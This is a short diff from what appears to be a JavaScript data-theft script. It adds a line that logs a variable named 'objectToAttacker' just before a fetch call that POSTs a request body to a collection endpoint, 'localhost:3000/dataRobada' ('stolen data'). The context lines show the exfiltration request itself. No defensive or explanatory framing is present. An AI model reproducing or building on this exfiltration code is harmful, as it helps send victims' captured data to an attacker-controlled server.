@@ -89,7 +89,7 @@ var requestOptions = {
   body: raw,
   redirect: 'follow'
 };
-
+console.log(objectToAttacker)
 fetch("http://localhost:3000/dataRobada", requestOptions)
   .then(response => response.text())
   .then(result => console.log(result))
